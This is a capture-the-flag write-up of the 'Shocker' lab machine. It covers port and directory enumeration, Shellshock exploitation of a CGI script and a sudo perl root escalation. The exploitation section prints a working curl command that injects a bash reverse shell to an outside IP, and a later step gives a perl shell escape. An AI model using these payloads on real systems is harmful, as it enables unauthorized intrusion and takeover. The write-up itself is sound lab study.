# Writeup: Shocker

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.94SVN scan initiated Wed Oct  1 09:04:55 2025 as: nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.129.235.72
Nmap scan report for 10.129.235.72
Host is up, received user-set (0.0071s latency).
Scanned at 2025-10-01 09:04:55 CDT for 15s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  1 09:05:10 2025 -- 1 IP address (1 host up) scanned in 15.09 seconds
```

On port 80 i found a webserver with a simple website only presenting a image file so i checked it for steganography but i did not found anything so i started a directory bruteforce which gives me a `/cgi-bin/` directory with status code `403`. I started a second directory bruteforce on `/cgi-bin/` and found a `user.sh`.

```shell
gobuster dir -u http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -o gobuster_scan2 -t 30 -x sh

/user.sh              (Status: 200) [Size: 119]
```

At this point i was stucked so i have done some research about the shellshock vulnerability since the machine is themed around it. I found a way to check for the shellshock vulnerabilty with nmap on [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html).

```
nmap shocker.htb -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-01 10:10 CDT
Nmap scan report for shocker.htb (10.129.235.72)
Host is up (0.0073s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

## 💥 Exploitation:

I used `curl` to exploit the shellshock vulnerability, which gives me back a reverse shell as user `shelly`, so i was able to grab the `user.txt` inside the home directory.

```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1' http://shocker.htb/cgi-bin/user.sh
```

## 🔓 Priviledge Escalation:

I have run the `sudo -l` command which gives me following output:

```
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Since `shocky` is allowed to run `sudo /usr/bin/perl` without providing a password i checked [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo) how to exploit this to gain the `root.txt`.

```shell
sudo perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
cd /root && cat root.txt
```

## 💰 Loot:

```shell
# user.txt
7f7441247c5b5212db38e6**********

# root.txt
d52c0d664522e034d35978**********
```